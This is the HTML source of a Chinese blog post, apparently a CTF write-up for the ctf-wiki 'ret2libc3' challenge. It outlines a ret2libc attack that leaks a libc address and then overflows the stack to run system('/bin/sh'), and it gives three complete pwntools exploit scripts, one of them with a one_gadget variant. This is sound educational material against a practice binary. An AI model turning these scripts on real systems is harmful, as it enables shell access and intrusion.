@@ -1,0 +1,1209 @@
+<!doctype html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+<meta http-equiv="content-language" content="zh-cn">
+
+<script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+<link href="//cdn.bootcss.com/pace/1.0.2/themes/pink/pace-theme-flash.css" rel="stylesheet">
+<style>
+    .pace .pace-progress {
+        background: #ff009e;
+        height: 3px;
+    }
+    .pace .pace-progress-inner {
+         box-shadow: 0 0 10px #e6006b, 0 0 5px #ff009e;
+    }
+    .pace .pace-activity {
+        border-top-color: #ff009e;
+        border-left-color: #ff009e;
+    }
+</style>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.0" rel="stylesheet" type="text/css">
+
+
+  <meta name="keywords" content="pwn,ret2libc3,">
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="pikachu's Blog" type="application/atom+xml">
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.png?v=5.1.0">
+
+
+
+
+
+
+<meta name="description" content="ctf-wiki 中 ret2libc3 没有 system 和 /bin/sh ，泄漏 libc">
+<meta name="keywords" content="pwn,ret2libc3">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ret2libc3">
+<meta property="og:url" content="https://hitcxy.com/2020/ret2libc3/index.html">
+<meta property="og:site_name" content="pikachu&#39;s Blog">
+<meta property="og:description" content="ctf-wiki 中 ret2libc3 没有 system 和 /bin/sh ，泄漏 libc">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2020-09-25T15:00:32.567Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="ret2libc3">
+<meta name="twitter:description" content="ctf-wiki 中 ret2libc3 没有 system 和 /bin/sh ，泄漏 libc">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    sidebar: {"position":"right","display":"post"},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: 'undefined',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: 'RI3NF6GUI0',
+      apiKey: '3d33fa60ba30d3b17f37220bb1a36749',
+      indexName: 'blogIndex',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://hitcxy.com/2020/ret2libc3/">
+
+
+
+<script>
+    (function(){
+        if(''){
+            if (prompt('请输入文章密码') !== ''){
+                alert('密码错误！');
+                history.back();
+            }
+        }
+    })();
+</script>
+
+
+  <title> ret2libc3 | pikachu's Blog </title>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?41fc030db57d5570dd22f78997dc4a7e";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container one-collumn sidebar-position-right page-post-detail ">
+    <div class="headband"></div>
+
+	<a href="https://github.com/hitcxy/blog" rel="external nofollow noopener noreferrer" target="_blank"><img style="position: absolute; top: 0; left: 0; border: 0;" src="https://camo.githubusercontent.com/82b228a3648bf44fc1163ef44c62fcc60081495e/68747470733a2f2f73332e616d617a6f6e6177732e636f6d2f6769746875622f726962626f6e732f666f726b6d655f6c6566745f7265645f6161303030302e706e67" alt="Fork me on GitHub" data-canonical-src="https://s3.amazonaws.com/github/ribbons/forkme_left_red_aa0000.png"></a>
+
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-meta ">
+  
+
+  <div class="custom-logo-site-title">
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <span class="site-title">pikachu's Blog</span>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+    
+      <h1 class="site-subtitle" itemprop="description">Easy coding,easy life.</h1>
+    
+</div>
+
+<div class="site-nav-toggle">
+  <button>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+  </button>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-guestbook">
+          <a href="/guestbook" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-commenting"></i> <br>
+            
+            留言
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-links">
+          <a href="/links" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-link"></i> <br>
+            
+            友链
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup">
+ <span class="search-icon fa fa-search"></span>
+ <input type="text" id="local-search-input">
+ <div id="local-search-result"></div>
+ <span class="popup-btn-close">close</span>
+</div>
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+  <link itemprop="mainEntityOfPage" href="https://hitcxy.com/2020/ret2libc3/">
+
+  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <meta itemprop="name" content="pikachu">
+    <meta itemprop="description" content>
+    <meta itemprop="image" content="/images/avatar/1.jpg">
+  </span>
+
+  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <meta itemprop="name" content="pikachu's Blog">
+    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
+      <img style="display:none;" itemprop="url image" alt="pikachu's Blog" src>
+    </span>
+  </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">
+            
+            
+              
+                ret2libc3
+              
+            
+          </h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-07-26T00:52:04+08:00">
+                2020-07-26
+              </time>
+            
+
+            
+              <span class="post-meta-divider">|</span>
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-check-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">更新于</span>
+              
+              <time title="更新于" itemprop="dateModified" datetime="2020-09-25T23:00:32+08:00">
+                2020-09-25
+              </time>
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/pwn/" itemprop="url" rel="index">
+                    <span itemprop="name">pwn</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+
+          
+
+          
+
+          
+
+          
+          
+             <span id="/2020/ret2libc3/" class="leancloud_visitors" data-flag-title="ret2libc3">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          <br><span class="post-time">
+           <span class="post-meta-item-icon">
+             <i class="fa fa-edit"></i>
+           </span>
+           <span class="post-meta-item-text">WordCount:</span>
+           <span class="post-count">892字</span>
+			<span class="post-meta-divider">|</span>
+			<span class="post-meta-item-text">min2read:</span>
+           <span class="post-count">5分钟</span>
+
+         </span>
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><ul>
+<li><code>ctf-wiki</code> 中 <code>ret2libc3</code></li>
+<li>没有 <code>system</code> 和 <code>/bin/sh</code> ，泄漏 <code>libc</code><a id="more"></a>
+</li>
+</ul>
+<h1 id="Analyse"><a href="#Analyse" class="headerlink" title="Analyse"></a>Analyse</h1><ul>
+<li>泄漏 <code>_start</code> 地址</li>
+<li>获取 <code>libc</code> 版本</li>
+<li>获取 <code>system</code> 与 <code>/bin/sh</code> 地址</li>
+<li>再次执行源程序</li>
+<li>触发栈溢出执行 <code>system(&#39;/bin/sh&#39;)</code></li>
+</ul>
+<h1 id="Exp-1"><a href="#Exp-1" class="headerlink" title="Exp 1"></a>Exp 1</h1><ul>
+<li>自己写的 <code>exp</code> ，根据泄漏的地址先找到 <code>libc</code></li>
+<li>到返回地址的偏移可使用 <code>cyclic</code> 快速判断<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local=<span class="number">1</span></span><br><span class="line">pc=<span class="string">'./ret2libc3'</span></span><br><span class="line">aslr=<span class="literal">True</span></span><br><span class="line">context.log_level=<span class="literal">True</span></span><br><span class="line"><span class="comment">#context.terminal = ["deepin-terminal","-x","sh","-c"]</span></span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">'./libc6_2.27-3ubuntu1.2_i386.so'</span>)</span><br><span class="line">ret2libc3 = ELF(<span class="string">'./ret2libc3'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local==<span class="number">1</span>:</span><br><span class="line">    <span class="comment">#p = process(pc,aslr=aslr,env=&#123;'LD_PRELOAD': './libc.so.6'&#125;)</span></span><br><span class="line">    p = process(pc,aslr=aslr)</span><br><span class="line">    <span class="comment">#gdb.attach(p,'c')</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    remote_addr=[<span class="string">'111.198.29.45'</span>, <span class="number">39802</span>]</span><br><span class="line">    p=remote(remote_addr[<span class="number">0</span>],remote_addr[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">ru = <span class="keyword">lambda</span> x : p.recvuntil(x)</span><br><span class="line">rud = <span class="keyword">lambda</span> x : p.recvuntil(x ,drop=<span class="literal">True</span>)</span><br><span class="line">sn = <span class="keyword">lambda</span> x : p.send(x)</span><br><span class="line">rl = <span class="keyword">lambda</span>   : p.recvline()</span><br><span class="line">sl = <span class="keyword">lambda</span> x : p.sendline(x)</span><br><span class="line">rv = <span class="keyword">lambda</span> x : p.recv(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b : p.sendlineafter(a,b)</span><br><span class="line">pi = <span class="keyword">lambda</span> : p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span><span class="params">(b =<span class="string">""</span>)</span>:</span></span><br><span class="line">    gdb.attach(io , b)</span><br><span class="line">    raw_input()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lg</span><span class="params">(s, addr)</span>:</span></span><br><span class="line">    log.info(<span class="string">'\033[1;31;40m %s --&gt; 0x%x \033[0m'</span> % (s,addr))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">raddr</span><span class="params">(a=<span class="number">6</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span>(a==<span class="number">6</span>):</span><br><span class="line">        <span class="keyword">return</span> u64(rv(a).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> u64(rl().strip(<span class="string">'\n'</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    puts_plt = ret2libc3.plt[<span class="string">'puts'</span>]</span><br><span class="line">    libc_start_main_got = ret2libc3.got[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">    start_addr = ret2libc3.symbols[<span class="string">'_start'</span>]</span><br><span class="line">    lg(<span class="string">'start_addr'</span>,start_addr)</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">'a'</span> * <span class="number">112</span></span><br><span class="line">    payload += p32(puts_plt)</span><br><span class="line">    payload += p32(start_addr)</span><br><span class="line">    payload += p32(libc_start_main_got)</span><br><span class="line">    payload += <span class="string">'\x00'</span></span><br><span class="line">    sl(payload)</span><br><span class="line"></span><br><span class="line">    ru(<span class="string">'Can you find it !?'</span>)</span><br><span class="line">    libc_start_main_addr = u32(p.recv()[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line">    lg(<span class="string">'libc_start_main_addr'</span>,libc_start_main_addr)</span><br><span class="line"></span><br><span class="line">    distance = libc.symbols[<span class="string">'system'</span>] - libc.symbols[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">    lg(<span class="string">'distance'</span>, distance)</span><br><span class="line">    libc_base_addr = libc_start_main_addr - libc.symbols[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">    system_addr = libc_base_addr + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">    binsh_addr = libc_base_addr + libc.search(<span class="string">"/bin/sh"</span>).next()</span><br><span class="line">    lg(<span class="string">'system_addr'</span>, system_addr)</span><br><span class="line">    lg(<span class="string">'binsh_addr'</span>, binsh_addr)</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">'a'</span> * <span class="number">112</span></span><br><span class="line">    payload += p32(system_addr)</span><br><span class="line">    payload += p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line">    payload += p32(binsh_addr)</span><br><span class="line">    sl(payload)</span><br><span class="line">    pi()</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<h1 id="Exp-2"><a href="#Exp-2" class="headerlink" title="Exp 2"></a>Exp 2</h1><ul>
+<li>先泄漏 <code>libc</code> ，然后使用 <code>one_gadget</code><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local=<span class="number">1</span></span><br><span class="line">pc=<span class="string">'./ret2libc3'</span></span><br><span class="line">aslr=<span class="literal">True</span></span><br><span class="line">context.log_level=<span class="literal">True</span></span><br><span class="line"><span class="comment">#context.terminal = ["deepin-terminal","-x","sh","-c"]</span></span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">'./libc6_2.27-3ubuntu1.2_i386.so'</span>)</span><br><span class="line">ret2libc3 = ELF(<span class="string">'./ret2libc3'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local==<span class="number">1</span>:</span><br><span class="line">    <span class="comment">#p = process(pc,aslr=aslr,env=&#123;'LD_PRELOAD': './libc.so.6'&#125;)</span></span><br><span class="line">    p = process(pc,aslr=aslr)</span><br><span class="line">    <span class="comment">#gdb.attach(p,'c')</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    remote_addr=[<span class="string">'111.198.29.45'</span>, <span class="number">39802</span>]</span><br><span class="line">    p=remote(remote_addr[<span class="number">0</span>],remote_addr[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">ru = <span class="keyword">lambda</span> x : p.recvuntil(x)</span><br><span class="line">rud = <span class="keyword">lambda</span> x : p.recvuntil(x ,drop=<span class="literal">True</span>)</span><br><span class="line">sn = <span class="keyword">lambda</span> x : p.send(x)</span><br><span class="line">rl = <span class="keyword">lambda</span>   : p.recvline()</span><br><span class="line">sl = <span class="keyword">lambda</span> x : p.sendline(x)</span><br><span class="line">rv = <span class="keyword">lambda</span> x : p.recv(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b : p.sendlineafter(a,b)</span><br><span class="line">pi = <span class="keyword">lambda</span> : p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span><span class="params">(b =<span class="string">""</span>)</span>:</span></span><br><span class="line">    gdb.attach(io , b)</span><br><span class="line">    raw_input()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lg</span><span class="params">(s, addr)</span>:</span></span><br><span class="line">    log.info(<span class="string">'\033[1;31;40m %s --&gt; 0x%x \033[0m'</span> % (s,addr))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">raddr</span><span class="params">(a=<span class="number">6</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span>(a==<span class="number">6</span>):</span><br><span class="line">        <span class="keyword">return</span> u64(rv(a).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> u64(rl().strip(<span class="string">'\n'</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    puts_plt = ret2libc3.plt[<span class="string">'puts'</span>]</span><br><span class="line">    libc_start_main_got = ret2libc3.got[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">    start_addr = ret2libc3.symbols[<span class="string">'_start'</span>]</span><br><span class="line">    lg(<span class="string">'start_addr'</span>,start_addr)</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">'a'</span> * <span class="number">112</span></span><br><span class="line">    payload += p32(puts_plt)</span><br><span class="line">    payload += p32(start_addr)</span><br><span class="line">    payload += p32(libc_start_main_got)</span><br><span class="line">    sl(payload)</span><br><span class="line"></span><br><span class="line">    ru(<span class="string">'Can you find it !?'</span>)</span><br><span class="line">    libc_start_main_addr = u32(p.recv()[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line">    lg(<span class="string">'libc_start_main_addr'</span>,libc_start_main_addr)</span><br><span class="line"></span><br><span class="line">    libc_base_addr = libc_start_main_addr - libc.symbols[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">    one_gadget = libc_base_addr + <span class="number">0x3d130</span></span><br><span class="line"></span><br><span class="line">    payload = <span class="string">'a'</span> * <span class="number">112</span></span><br><span class="line">    payload += p32(one_gadget)</span><br><span class="line">    sl(payload)</span><br><span class="line">    pi()</span><br><span class="line"></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">0x3d130 execve("/bin/sh", esp+0x40, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  esi is the GOT address of libc</span></span><br><span class="line"><span class="string">  [esp+0x40] == NULL</span></span><br><span class="line"><span class="string">"""</span></span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<h1 id="Exp-3"><a href="#Exp-3" class="headerlink" title="Exp 3"></a>Exp 3</h1><ul>
+<li>网上找的另一个版本使用 <code>LibcSearcher</code> 泄漏 <code>libc</code><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line"></span><br><span class="line">context.binary=<span class="string">'ret2libc3'</span></span><br><span class="line">sh = process(<span class="string">'./ret2libc3'</span>)</span><br><span class="line"></span><br><span class="line">ret2libc3 = ELF(<span class="string">'./ret2libc3'</span>)</span><br><span class="line">puts_plt = ret2libc3.plt[<span class="string">'puts'</span>]</span><br><span class="line">libc_start_main_got = ret2libc3.got[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">main = ret2libc3.symbols[<span class="string">'_start'</span>]</span><br><span class="line">print(<span class="string">"leak main_got addr and return main"</span>)</span><br><span class="line"></span><br><span class="line">payload = flat([<span class="string">'A'</span>*<span class="number">112</span>,puts_plt,main,libc_start_main_got])</span><br><span class="line">sh.sendlineafter(<span class="string">'Can you find it !?'</span>,payload)</span><br><span class="line"></span><br><span class="line">libc_start_main_addr = u32(sh.recv()[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line">print(hex(libc_start_main_addr))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">'__libc_start_main'</span>,libc_start_main_addr)</span><br><span class="line">libcbase = libc_start_main_addr-libc.dump(<span class="string">'__libc_start_main'</span>)</span><br><span class="line">system_addr = libcbase+libc.dump(<span class="string">'system'</span>)</span><br><span class="line">binsh_addr = libcbase +libc.dump(<span class="string">'str_bin_sh'</span>)</span><br><span class="line"></span><br><span class="line">print(<span class="string">"now get shell"</span>)</span><br><span class="line">payload = flat([<span class="string">'A'</span>*<span class="number">112</span>,system_addr,<span class="string">'A'</span>*<span class="number">4</span>,binsh_addr])</span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure></li>
+</ul>
+
+      <script>
+        window.disqusProxy={
+          shortname: 'undefined',
+          username: 'pikachu',
+          server: 'undefined',
+          port: 5509,
+          adminAvatar: '/avatars/admin-avatar.jpg',
+          identifier: '2020/ret2libc3/',
+        };
+        window.disqus_config = function () {
+          this.page.url = window.location.href;
+          this.page.identifier = window.disqusProxy.identifier;
+        };
+      </script>
+      
+    </div>
+
+<div style="text-align:center;color: #ccc;font-size:14px;">---------------- The End ----------------</div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+
+  <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+    <div>谢谢大爷～</div>
+    <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+      <span>赏</span>
+    </button>
+    <div id="QR" style="display: none;">
+      
+        <div id="wechat" style="display: inline-block">
+          <img id="wechat_qr" src="/images/donate/wechat.png" alt="pikachu WeChat Pay">
+          <p>微信打赏</p>
+        </div>
+      
+      
+        <div id="alipay" style="display: inline-block">
+          <img id="alipay_qr" src="/images/donate/alipay.jpg" alt="pikachu Alipay">
+          <p>支付宝打赏</p>
+        </div>
+      
+    </div>
+  </div>
+
+
+      
+    </div>
+<div>
+	  
+	    <p id="div-border-left-red">
+		Author：<b>pikachu</b><br>
+		Link：<a href="/2020/ret2libc3/" title="ret2libc3">https://hitcxy.com/2020/ret2libc3/</a><br>
+		Contact：<a>hitcxy@hotmail.com</a><br>
+	   <b>本文基于<a target="_blank" title="Creative Commons Attribution-ShareAlike 4.0 International (CC BY-SA 4.0)" href="http://creativecommons.org/licenses/by-sa/4.0/" rel="external nofollow noopener noreferrer"> 知识共享署名-相同方式共享 4.0 </a>国际许可协议发布</b><br>
+	    <b>转载请注明出处，谢谢！</b>
+	    </p>
+	  
+	</div>
+
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/pwn/" rel="tag"><i class="fa fa-tag"></i> pwn</a>
+          
+            <a href="/tags/ret2libc3/" rel="tag"><i class="fa fa-tag"></i> ret2libc3</a>
+          
+        </div>
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/plt-got/" rel="next" title="plt&got">
+                <i class="fa fa-chevron-left"></i> plt&got
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2020/32-64/" rel="prev" title="32&64">
+                32&64 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
